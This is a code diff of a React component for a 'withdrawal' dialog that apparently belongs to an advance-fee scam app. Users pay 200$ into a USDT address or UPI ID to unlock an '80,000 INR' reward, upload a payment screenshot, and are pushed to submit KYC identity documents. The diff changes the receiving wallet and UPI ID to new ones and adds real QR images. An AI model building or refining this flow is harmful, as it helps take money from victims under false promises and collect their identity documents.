@@ -4,7 +4,7 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { supabase } from "@/integrations/supabase/client";
 import { useToast } from "@/hooks/use-toast";
-import { AlertTriangle, Upload, QrCode, Copy } from "lucide-react";
+import { AlertTriangle, Upload, Copy } from "lucide-react";
 
 interface WithdrawalDialogProps {
   open: boolean;
@@ -19,15 +19,14 @@ const plans = [
   { id: 3, usdAmount: "200$", inrAmount: "20,000", reward: "80,000 INR" },
 ];
 
-const USDT_ADDRESS = "TXqH7kBPae4oCgVt8WQhVfxv9yZL6K1erN";
-const UPI_ID = "elitepay@okaxis";
+const USDT_ADDRESS = "TYud5LurN9hn16yy5K4gMiyLHpNJRa93C6";
+const UPI_ID = "sahilkhan122@ptaxis";
 
 const WithdrawalDialog = ({ open, onClose, fundType, userId }: WithdrawalDialogProps) => {
   const [step, setStep] = useState<"plans" | "method" | "payment">("plans");
   const [selectedPlan, setSelectedPlan] = useState<typeof plans[0] | null>(null);
   const [method, setMethod] = useState<"usdt" | "inr" | null>(null);
   const [uploading, setUploading] = useState(false);
-  const [hasBankAccount, setHasBankAccount] = useState(false);
   const fileRef = useRef<HTMLInputElement>(null);
   const { toast } = useToast();
 
@@ -37,9 +36,14 @@ const WithdrawalDialog = ({ open, onClose, fundType, userId }: WithdrawalDialogP
     setMethod(null);
   };
 
-  const checkBankAccount = async () => {
-    const { data } = await supabase.from("bank_accounts").select("id").eq("user_id", userId).limit(1);
-    return data && data.length > 0;
+  const checkBankAndKyc = async () => {
+    const [bankRes, kycRes] = await Promise.all([
+      supabase.from("bank_accounts").select("id").eq("user_id", userId).limit(1),
+      supabase.from("kyc_documents").select("id").eq("user_id", userId).limit(1),
+    ]);
+    const hasBank = bankRes.data && bankRes.data.length > 0;
+    const hasKyc = kycRes.data && kycRes.data.length > 0;
+    return { hasBank, hasKyc };
   };
 
   const selectPlan = (plan: typeof plans[0]) => {
@@ -58,8 +62,8 @@ const WithdrawalDialog = ({ open, onClose, fundType, userId }: WithdrawalDialogP
 
     setUploading(true);
     try {
-      const hasBank = await checkBankAccount();
-      
+      const { hasBank, hasKyc } = await checkBankAndKyc();
+
       const fileName = `${userId}/${Date.now()}_${file.name}`;
       const { error: uploadError } = await supabase.storage.from("screenshots").upload(fileName, file);
       if (uploadError) throw uploadError;
@@ -76,16 +80,28 @@ const WithdrawalDialog = ({ open, onClose, fundType, userId }: WithdrawalDialogP
       });
       if (insertError) throw insertError;
 
-      if (hasBank) {
+      if (!hasBank && !hasKyc) {
         toast({
           title: "Payment submitted!",
-          description: "Deposit will be confirmed shortly and withdrawal amount will be reflected in your bank account soon.",
+          description: "Please add a bank account and complete KYC verification to receive your withdrawal.",
+          variant: "destructive",
         });
-      } else {
+      } else if (!hasBank) {
         toast({
           title: "Payment submitted!",
           description: "Please add a bank account to receive your withdrawal.",
           variant: "destructive",
+        });
+      } else if (!hasKyc) {
+        toast({
+          title: "Payment submitted!",
+          description: "Please complete KYC verification to receive your withdrawal.",
+          variant: "destructive",
+        });
+      } else {
+        toast({
+          title: "Payment submitted!",
+          description: "Deposit will be verified and withdrawal amount will be reflected in your bank account soon.",
         });
       }
       onClose();
@@ -155,7 +171,7 @@ const WithdrawalDialog = ({ open, onClose, fundType, userId }: WithdrawalDialogP
             {method === "usdt" ? (
               <>
                 <div className="bg-secondary/50 rounded-lg p-4 text-center">
-                  <QrCode className="w-32 h-32 mx-auto text-primary mb-3" />
+                  <img src="/images/usdt-qr.png" alt="USDT QR Code" className="w-40 h-40 mx-auto mb-3 rounded-lg" />
                   <p className="text-xs text-muted-foreground mb-2">USDT TRC20 Address</p>
                   <div className="flex items-center justify-center gap-2">
                     <code className="text-xs text-foreground bg-background px-2 py-1 rounded break-all">{USDT_ADDRESS}</code>
@@ -172,7 +188,7 @@ const WithdrawalDialog = ({ open, onClose, fundType, userId }: WithdrawalDialogP
             ) : (
               <>
                 <div className="bg-secondary/50 rounded-lg p-4 text-center">
-                  <QrCode className="w-32 h-32 mx-auto text-primary mb-3" />
+                  <img src="/images/upi-qr.png" alt="UPI QR Code" className="w-40 h-40 mx-auto mb-3 rounded-lg" />
                   <p className="text-xs text-muted-foreground mb-2">UPI ID</p>
                   <div className="flex items-center justify-center gap-2">
                     <code className="text-foreground font-mono">{UPI_ID}</code>
